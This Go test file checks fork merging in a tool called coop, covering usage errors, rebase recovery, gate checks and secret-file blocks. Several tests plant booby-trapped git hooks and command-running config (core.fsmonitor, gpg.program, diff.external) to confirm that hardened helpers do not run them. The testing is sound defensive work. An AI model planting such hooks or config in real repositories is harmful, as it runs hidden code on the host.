package forkctl

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/AndrewDryga/coop/internal/config"
	"github.com/AndrewDryga/coop/internal/forkspace"
	"github.com/AndrewDryga/coop/internal/runtime"
)

// A missing <name> (without --all) is a usage error (exit 2), reported before the dirty-tree /
// non-interactive environment gates — so the user sees the real problem, not "uncommitted changes".
func TestForkMergeRequiresName(t *testing.T) {
	c := &Control{cfg: &config.Config{}}
	if code, err := c.ForkMerge(nil); code != 2 || err == nil || !strings.Contains(err.Error(), "usage") {
		t.Errorf("ForkMerge(nil) = (%d, %v), want (2, usage error)", code, err)
	}
	if code, err := c.ForkMerge([]string{"--nope"}); code != 2 || err == nil {
		t.Errorf("ForkMerge(--nope) = (%d, %v), want (2, unknown-flag error)", code, err)
	}
	if code, err := c.ForkMerge([]string{"perf", "--all", "--yes"}); code != 2 || err == nil || !strings.Contains(err.Error(), "mutually exclusive") {
		t.Errorf("ForkMerge(perf --all --yes) = (%d, %v), want (2, mutually-exclusive error)", code, err)
	}
}

func TestForkMergePreflightsUnsupportedStateBeforeEnvironmentGates(t *testing.T) {
	for _, args := range [][]string{{"old", "--yes"}, {"--all", "--yes"}} {
		t.Run(strings.Join(args, "_"), func(t *testing.T) {
			repo := initRepo(t)
			if _, err := forkspace.Setup(repo, "old"); err != nil {
				t.Fatal(err)
			}
			if err := os.MkdirAll(forkspace.StateDir(repo), 0o755); err != nil {
				t.Fatal(err)
			}
			raw := []byte("owner-v2\nopaque\n")
			path := forkspace.PidPath(repo, "old")
			if err := os.WriteFile(path, raw, 0o644); err != nil {
				t.Fatal(err)
			}
			runtimeCalls := 0
			c := &Control{
				cfg: &config.Config{RepoOverride: repo, Gate: []string{"true"}},
				host: Host{EnsureRuntime: func() (runtime.Runtime, error) {
					runtimeCalls++
					return runtime.Runtime{}, errors.New("runtime must not be consulted")
				}},
			}
			code, err := c.ForkMerge(args) // --yes lets a missing preflight reach the configured runtime gate
			if code != 1 || err == nil || !strings.Contains(err.Error(), "unsupported detached-worker state version") || strings.Contains(err.Error(), "--yes") {
				t.Fatalf("ForkMerge(%v) unsupported state = (%d, %v), want pre-gate version refusal", args, code, err)
			}
			if got, readErr := os.ReadFile(path); readErr != nil || string(got) != string(raw) {
				t.Fatalf("unsupported state changed = %q, %v; want exact %q", got, readErr, raw)
			}
			if runtimeCalls != 0 {
				t.Fatalf("unsupported merge resolved its runtime %d time(s)", runtimeCalls)
			}
		})
	}
}

func TestForkMergeRunningRefusalKeepsLifecycleExitClass(t *testing.T) {
	repo := initRepo(t)
	if _, err := forkspace.Setup(repo, "busy"); err != nil {
		t.Fatal(err)
	}
	if err := forkspace.WritePid(repo, "busy", os.Getpid()); err != nil {
		t.Fatal(err)
	}
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	code, err := c.ForkMerge([]string{"busy", "--yes"})
	if code != 1 || err == nil || !strings.Contains(err.Error(), "running or awaiting cleanup") {
		t.Fatalf("ForkMerge(running) = (%d, %v), want lifecycle refusal class 1", code, err)
	}
}

func TestForkMergeRechecksUnsupportedStateUnderLifecycleLock(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "race")
	if err != nil {
		t.Fatal(err)
	}
	head := gitOut(repo, "rev-parse", "HEAD")
	raw := []byte("owner-v2\nopaque\n")
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	got := runForkCommandAcrossLockedMutation(t, repo, "race", func() (int, error) {
		return c.ForkMerge([]string{"race", "--yes"})
	}, func() {
		if err := os.WriteFile(forkspace.PidPath(repo, "race"), raw, 0o644); err != nil {
			t.Fatal(err)
		}
	})
	if got.code == 0 || got.err == nil || !strings.Contains(got.err.Error(), "unsupported detached-worker state version") {
		t.Fatalf("ForkMerge after state replacement = (%d, %v), want locked version refusal", got.code, got.err)
	}
	if gitOut(repo, "rev-parse", "HEAD") != head || !pathExists(ws) {
		t.Fatal("merge mutated the parent or workspace after unsupported state appeared")
	}
	if data, readErr := os.ReadFile(forkspace.PidPath(repo, "race")); readErr != nil || string(data) != string(raw) {
		t.Fatalf("unsupported state changed = %q, %v; want exact %q", data, readErr, raw)
	}
}

func TestDestroyLandedForkRechecksUnsupportedStateUnderLifecycleLock(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "landed")
	if err != nil {
		t.Fatal(err)
	}
	raw := []byte("owner-v2\nopaque\n")
	got := runForkCommandAcrossLockedMutation(t, repo, "landed", func() (int, error) {
		if err := destroyLandedFork(runtime.Runtime{}, repo, "landed"); err != nil {
			return 1, err
		}
		return 0, nil
	}, func() {
		if err := os.WriteFile(forkspace.PidPath(repo, "landed"), raw, 0o644); err != nil {
			t.Fatal(err)
		}
	})
	if got.code != 1 || got.err == nil || !strings.Contains(got.err.Error(), "unsupported detached-worker state version") {
		t.Fatalf("destroy after state replacement = (%d, %v), want locked version refusal", got.code, got.err)
	}
	if !pathExists(ws) {
		t.Fatal("post-land cleanup deleted a workspace with unsupported state")
	}
}

func TestMergeOneNoGate(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}} // no COOP_GATE → no box needed

	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	landed, err := c.mergeOne(repo, "", "perf", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's file")
	}
}

// TestMergeOneSurfacesReconcileFailure: when the parent queue can't be reconciled after a land, the
// merge is NOT rolled back — the fork's commits are in the parent — but the failure travels back with
// it, so `coop fork merge` reports it and exits nonzero instead of leaving the loop to redo the work.
func TestMergeOneSurfacesReconcileFailure(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	// A tasks path outside the repo: coop cannot work out which queues the land should reconcile.
	c := &Control{cfg: &config.Config{TasksFiles: []string{filepath.Join(t.TempDir(), "elsewhere")}}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work\n\nCoop-Task: t1")

	landed, err := c.mergeOne(repo, "", "perf", false)
	if !landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want (true, a surfaced reconcile failure)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("a reconcile failure rolled the landed merge back — the land already stuck, only bookkeeping failed")
	}
	for _, want := range []string{"perf", "coop tasks done"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("reconcile failure %q does not name %q", err, want)
		}
	}
}

// TestMergeOneRebasesNamedBranch (M3): landing rebases the fork's OWN branch by name, even if the
// agent left a different branch checked out in the ws. With the parent moved forward, a non-rebased
// branch wouldn't fast-forward — so a clean land here proves `name` (not the stray branch) was rebased.
func TestMergeOneRebasesNamedBranch(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	// The fork's real work, committed on its branch "perf".
	if err := os.WriteFile(filepath.Join(ws, "wanted.txt"), []byte("real work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "perf work")
	// The parent moves forward, so a non-rebased branch could not fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "parent.txt"), []byte("moved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves on")
	// The agent wanders off onto a different branch in the ws.
	git(t, ws, "checkout", "-q", "-b", "stray")
	if err := os.WriteFile(filepath.Join(ws, "stray.txt"), []byte("not this\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "stray work")

	landed, err := c.mergeOne(repo, "", "perf", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil) — it must rebase the named branch", landed, err)
	}
	if !pathExists(filepath.Join(repo, "wanted.txt")) {
		t.Error("did not land the fork's named-branch work")
	}
	if pathExists(filepath.Join(repo, "stray.txt")) {
		t.Error("wrongly landed the stray checked-out branch")
	}
}

func TestMergeOneConflictRollsBack(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}

	ws, err := forkspace.Setup(repo, "a")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	// Fork and parent edit the same line → a merge conflict.
	if err := os.WriteFile(filepath.Join(ws, "README.md"), []byte("fork-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "commit", "-aqm", "fork edit")
	if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("parent-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "commit", "-aqm", "parent edit")

	landed, err := c.mergeOne(repo, "", "a", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want (false, error)", landed, err)
	}
	// The conflicted merge must be fully aborted: tree clean, parent content intact.
	if gitDirty(repo) {
		t.Error("working tree left dirty after a conflicted merge")
	}
	if data, _ := os.ReadFile(filepath.Join(repo, "README.md")); string(data) != "parent-version\n" {
		t.Errorf("README.md = %q, want %q", data, "parent-version\n")
	}
}

// A coop killed mid-land (host crash, SIGKILL) leaves git's rebase state in the fork's clone, and
// every later merge used to die on it. The next merge recovers it — but only when nobody could still
// own that worktree, because `rebase --abort` resets it.
func TestMergeRecoversInterruptedRebase(t *testing.T) {
	t.Run("abandoned worktree recovers and the fork lands", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		c := &Control{cfg: &config.Config{}}
		landed, err := c.mergeOne(repo, "", "perf", false)
		if !landed || err != nil {
			t.Fatalf("mergeOne over leftover rebase state = (%v, %v), want the merge to recover and land", landed, err)
		}
		if data, _ := os.ReadFile(filepath.Join(repo, "feature.txt")); string(data) != "work\n" {
			t.Errorf("landed feature.txt = %q, want the fork's own work", data)
		}
		if left := leftoverRebaseState(ws); left != "" {
			t.Errorf("rebase state %q survived the merge", left)
		}
		if branch := gitBranch(ws); branch != "perf" {
			t.Errorf("fork left on branch %q, want perf restored by the abort", branch)
		}
	})

	t.Run("provably dead owner recovers", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		// A worker state whose pid the kernel answers ESRCH for: nothing can be running.
		if err := os.MkdirAll(forkspace.StateDir(repo), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := forkspace.WriteWorkerState(repo, "perf", forkspace.WorkerState{Pid: 2147483646, Token: "linux-proc-v1:1:2"}); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		if err := c.rebaseForkOntoParent(repo, ws, "perf"); err != nil {
			t.Fatalf("rebase over a dead owner's leftover state = %v, want recovery", err)
		}
		if left := leftoverRebaseState(ws); left != "" {
			t.Errorf("rebase state %q survived the recovery", left)
		}
		// The recovery let the real rebase run: the fork's commit now sits on the parent's HEAD.
		if base, head := gitOut(ws, "rev-parse", "perf~1"), gitOut(repo, "rev-parse", "HEAD"); base != head {
			t.Errorf("perf~1 = %q, want the parent HEAD %q", base, head)
		}
	})

	t.Run("live owner refuses", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		// mergeOne refuses any fork with lifecycle state well before this, so drive the rebase
		// directly: the recovery must guard its own destructive abort, not lean on that check.
		if err := forkspace.WritePid(repo, "perf", os.Getpid()); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		err := c.rebaseForkOntoParent(repo, ws, "perf")
		if err == nil || !strings.Contains(err.Error(), strconv.Itoa(os.Getpid())) || !strings.Contains(err.Error(), "coop fork stop perf") {
			t.Fatalf("rebase over a live owner's leftover state = %v, want a refusal naming pid %d", err, os.Getpid())
		}
		if leftoverRebaseState(ws) == "" {
			t.Error("a refused recovery still aborted the live owner's rebase")
		}
	})

	t.Run("unverifiable owner refuses", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		if err := forkspace.WritePid(repo, "perf", os.Getpid()); err != nil {
			t.Fatal(err)
		}
		oldRead := forkspace.ReadProcStartToken
		forkspace.ReadProcStartToken = func(int) string { return "" } // liveness undecidable, so nothing is provable
		t.Cleanup(func() { forkspace.ReadProcStartToken = oldRead })
		c := &Control{cfg: &config.Config{}}
		err := c.rebaseForkOntoParent(repo, ws, "perf")
		if err == nil || !strings.Contains(err.Error(), "coop fork stop perf") {
			t.Fatalf("rebase over an unverifiable owner = %v, want a fail-closed refusal", err)
		}
		if leftoverRebaseState(ws) == "" {
			t.Error("a refused recovery still aborted an unverifiable owner's rebase")
		}
	})

	t.Run("an abort that fails surfaces the manual recovery", func(t *testing.T) {
		if _, err := exec.LookPath("git"); err != nil {
			t.Skip("git not available")
		}
		repo := initRepo(t)
		ws, err := forkspace.Setup(repo, "perf")
		if err != nil {
			t.Fatalf("forkspace.Setup: %v", err)
		}
		// State git itself cannot abort: an am-backend directory with no rebase behind it.
		if err := os.Mkdir(filepath.Join(ws, ".git", "rebase-apply"), 0o755); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		if err := c.rebaseForkOntoParent(repo, ws, "perf"); err == nil ||
			!strings.Contains(err.Error(), "could not abort") || !strings.Contains(err.Error(), ws) {
			t.Fatalf("failed abort = %v, want a loud error carrying git's reason and the manual recovery", err)
		}
	})
}

// forkWithInterruptedRebase builds a parent and a fork whose clone was left mid-rebase, exactly as a
// coop killed during a land leaves it: git's state directory present, the fork's commit unlanded.
func forkWithInterruptedRebase(t *testing.T) (string, string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	// The parent moves on, so a land can only succeed if the fork was really rebased onto it.
	if err := os.WriteFile(filepath.Join(repo, "parent.txt"), []byte("moved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves on")
	// Strand a real rebase: replaying the fork's commit onto a sibling that touched the same file
	// conflicts, so git stops and leaves its state directory behind — no synthetic dir.
	git(t, ws, "checkout", "-q", "-b", "sibling", "perf~1")
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("sibling\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "sibling work")
	if out, err := exec.Command("git", "-C", ws, "rebase", "sibling", "perf").CombinedOutput(); err == nil {
		t.Fatalf("fixture: the rebase was meant to conflict:\n%s", out)
	}
	if leftoverRebaseState(ws) == "" {
		t.Fatal("fixture: git left no rebase state behind")
	}
	return repo, ws
}

// TestMergeOneAbortsWhenParentMovesDuringGate is the core of the CAS fix: if a commit lands on the
// parent WHILE the gate runs, the fast-forward-only merge must refuse — landing nothing and leaving
// the concurrent commit intact — instead of a reset --hard erasing it. The gate seam injects the
// concurrent commit to open that window deterministically.
func TestMergeOneAbortsWhenParentMovesDuringGate(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	// The gate "passes", but a concurrent commit lands on the parent while it runs.
	c.gateOK = func(_, _, _ string) bool {
		if err := os.WriteFile(filepath.Join(repo, "hotfix.txt"), []byte("urgent\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, repo, "add", "-A")
		git(t, repo, "commit", "-qm", "concurrent hotfix")
		return true
	}
	landed, err := c.mergeOne(repo, "gate-img", "perf", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want abort — the parent moved during the gate", landed, err)
	}
	// The concurrent commit survives (not erased), and the fork did NOT land.
	if !pathExists(filepath.Join(repo, "hotfix.txt")) {
		t.Error("the concurrent commit was erased — reset --hard regression")
	}
	if pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("the fork landed onto a moved parent — the CAS did not refuse")
	}
}

// TestMergeOneGateFailLeavesParentUntouched: a red gate never mutates the parent — nothing to roll
// back — because the gate runs on the candidate (the fork clone), not the live parent.
func TestMergeOneGateFailLeavesParentUntouched(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	pre := gitOut(repo, "rev-parse", "HEAD")
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	c.gateOK = func(_, _, _ string) bool { return false } // red gate
	landed, err := c.mergeOne(repo, "gate-img", "perf", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want a gate failure", landed, err)
	}
	if pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("the fork landed despite a red gate")
	}
	if head := gitOut(repo, "rev-parse", "HEAD"); head != pre {
		t.Errorf("parent HEAD moved on a red gate: %s → %s", pre, head)
	}
	if gitDirty(repo) {
		t.Error("parent tree left dirty after a red gate")
	}
}

// TestMergeOneGatePassLands: a green gate advances the parent (the seam lets this run without a box).
func TestMergeOneGatePassLands(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	c.gateOK = func(_, _, _ string) bool { return true } // green gate
	landed, err := c.mergeOne(repo, "gate-img", "perf", false)
	if !landed || err != nil {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("a green gate should have landed the fork")
	}
}

func TestMergeOnePolicyForce(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "leak")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, ".env"), []byte("S=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "leak")

	// Without --force the policy guard blocks the secret-like file.
	if landed, err := c.mergeOne(repo, "", "leak", false); landed || err == nil {
		t.Fatalf("mergeOne(force=false) = (%v, %v), want blocked", landed, err)
	}
	if pathExists(filepath.Join(repo, ".env")) {
		t.Fatal(".env landed despite the policy block")
	}
	// With --force it lands.
	if landed, err := c.mergeOne(repo, "", "leak", true); !landed || err != nil {
		t.Fatalf("mergeOne(force=true) = (%v, %v), want landed", landed, err)
	}
	if !pathExists(filepath.Join(repo, ".env")) {
		t.Error(".env not landed with --force")
	}
}

// plantForkBooby rigs a fork's agent-writable .git/ to run host commands: every git
// hook plus the config knobs that shell out (core.fsmonitor, core.hooksPath, and a
// forced commit.gpgsign with a planted gpg.program). Each writes a line to marker, so
// its existence proves something in the fork executed on the host.
func plantForkBooby(t *testing.T, ws, marker string) {
	t.Helper()
	hooks := filepath.Join(ws, ".git", "hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\necho pwned >> " + marker + "\n"
	for _, h := range []string{"pre-rebase", "post-rewrite", "post-checkout", "post-commit", "post-merge"} {
		if err := os.WriteFile(filepath.Join(hooks, h), []byte(script), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	// A standalone script reused for the command-running config knobs (gpg.program
	// must still emit a signature, so it cats stdin after marking).
	evil := filepath.Join(ws, ".git", "evil.sh")
	if err := os.WriteFile(evil, []byte(script+"cat\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "core.hooksPath", hooks)
	git(t, ws, "config", "core.fsmonitor", evil)
	git(t, ws, "config", "commit.gpgsign", "true")
	git(t, ws, "config", "gpg.program", evil)
}

// A fork's .git/ is agent-writable, so the host-side git commands a merge runs in it
// must not execute fork-planted hooks or command-running config.
func TestMergeOneIgnoresForkBooby(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}

	ws, err := forkspace.Setup(repo, "evil")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent on a different file so landing must rebase/replay (which is
	// what fires pre-rebase/post-checkout/post-rewrite) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	marker := filepath.Join(t.TempDir(), "PWNED")
	plantForkBooby(t, ws, marker)

	landed, err := c.mergeOne(repo, "", "evil", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatalf("a fork-controlled git hook/config executed on the host during merge (marker created)")
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's work")
	}
	// Positive control: the trap is live — a genuinely *raw* git command (bypassing coop's now-
	// hardened helpers entirely) fires it, so the clean run above is the hardening working, not a
	// no-op test. (gitDirty itself is hardened now, so it can't be the control any more.)
	_ = exec.Command("git", "-C", ws, "status", "--porcelain").Run() // raw → runs the planted core.fsmonitor
	if !pathExists(marker) {
		t.Fatal("positive control failed: raw fork git did not trigger the booby trap, so the test proves nothing")
	}
}

// A non-interactive `coop fork merge` must refuse without --yes (it lands work and
// deletes the fork), and proceed with it.
func TestForkMergeNonTTYRequiresYes(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	// Force a non-interactive stdin regardless of how the suite is run — a real TTY
	// would send the un-gated path into an interactive prompt and block.
	devnull, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer devnull.Close()
	saved := os.Stdin
	os.Stdin = devnull
	defer func() { os.Stdin = saved }()

	repo := initRepo(t)
	c := &Control{cfg: &config.Config{RepoOverride: repo}} // no gate → no box
	ws, err := forkspace.Setup(repo, "a")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "a.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	// Without --yes: refuse, before landing, fork intact.
	if code, err := c.ForkMerge([]string{"a"}); err == nil || code == 0 {
		t.Fatalf("ForkMerge(no --yes) = (%d, %v), want a refusal", code, err)
	}
	if pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt landed despite the non-interactive refusal")
	}
	if !pathExists(ws) {
		t.Error("fork was removed despite the refusal")
	}

	// With --yes: lands and removes the fork.
	if code, err := c.ForkMerge([]string{"a", "--yes"}); err != nil || code != 0 {
		t.Fatalf("ForkMerge(--yes) = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt did not land with --yes")
	}
	if pathExists(ws) {
		t.Error("fork not removed after a --yes land")
	}
}

func TestForkMergeQueue(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	// Two independent forks, each adding a distinct file.
	for _, n := range []string{"a", "b"} {
		ws, err := forkspace.Setup(repo, n)
		if err != nil {
			t.Fatalf("forkspace.Setup %s: %v", n, err)
		}
		if err := os.WriteFile(filepath.Join(ws, n+".txt"), []byte(n+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, ws, "add", "-A")
		git(t, ws, "commit", "-qm", n)
	}
	if code, err := c.forkMergeAll(repo, forkspace.Names(repo), "", false, true); err != nil || code != 0 { // yes=true: approve the bulk land
		t.Fatalf("forkMergeAll = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) || !pathExists(filepath.Join(repo, "b.txt")) {
		t.Error("merge queue did not land both forks")
	}
	if got := forkspace.Names(repo); len(got) != 0 {
		t.Errorf("forks remain after the queue closed them: %v", got)
	}
	// Rebasing must keep history linear — no merge commits.
	if merges := gitOut(repo, "rev-list", "--merges", "HEAD"); merges != "" {
		t.Errorf("rebase queue produced merge commits (history not linear):\n%s", merges)
	}
}

// Task (security 1): every host-side git command coop runs against the PARENT repo must be
// hardened too — the parent's .git (config + hooks) is agent-writable on a normal box run, so a
// poisoned knob must not execute host code when coop reads/merges/diffs it. Each case fires a
// positive control with genuinely raw git, so a green test means the hardening works, not a dead
// trap. (Forks were already covered by TestMergeOneIgnoresForkBooby; this guards the parent.)
func TestHostGitHardeningOnPoisonedParent(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	markerScript := func(t *testing.T, path, marker string) {
		t.Helper()
		if err := os.WriteFile(path, []byte("#!/bin/sh\necho pwned >> "+marker+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	// (a) a poisoned core.fsmonitor must not fire when coop runs `git status` (gitDirty).
	t.Run("fsmonitor on status", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "core.fsmonitor", evil)
		_ = gitDirty(repo) // hardened — must not run fsmonitor
		if pathExists(marker) {
			t.Fatal("gitDirty ran the parent's core.fsmonitor on the host")
		}
		_ = exec.Command("git", "-C", repo, "status", "--porcelain").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git status did not fire the planted fsmonitor")
		}
	})

	// (b) a planted post-merge hook must not fire through the merge helper (FastForwardParent ff's the parent).
	t.Run("post-merge hook on merge", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		hooks := filepath.Join(repo, ".git", "hooks")
		if err := os.MkdirAll(hooks, 0o755); err != nil {
			t.Fatal(err)
		}
		markerScript(t, filepath.Join(hooks, "post-merge"), marker)
		git(t, repo, "config", "core.hooksPath", ".git/hooks")
		ahead := func(branch string) { // a branch one commit ahead of main, so --ff-only fast-forwards
			git(t, repo, "checkout", "-q", "-b", branch)
			if err := os.WriteFile(filepath.Join(repo, branch+".txt"), []byte("x\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			git(t, repo, "add", "-A")
			git(t, repo, "commit", "-qm", branch)
			git(t, repo, "checkout", "-q", "main")
		}
		ahead("a1")
		if err := gitRun(repo, "merge", "--ff-only", "a1"); err != nil { // hardened
			t.Fatalf("merge a1: %v", err)
		}
		if pathExists(marker) {
			t.Fatal("the parent's post-merge hook fired through the hardened merge helper")
		}
		ahead("a2")
		_ = exec.Command("git", "-C", repo, "merge", "--ff-only", "a2").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git merge did not fire the planted post-merge hook")
		}
	})

	// (c) a poisoned diff.external must not run when coop diffs the parent.
	t.Run("diff.external on diff", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "diff.external", evil)
		if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("changed\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		_ = gitOut(repo, "diff") // hardened — diff.external blanked
		if pathExists(marker) {
			t.Fatal("gitOut diff ran the parent's diff.external on the host")
		}
		_ = exec.Command("git", "-C", repo, "diff").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git diff did not run the planted diff.external")
		}
	})
}

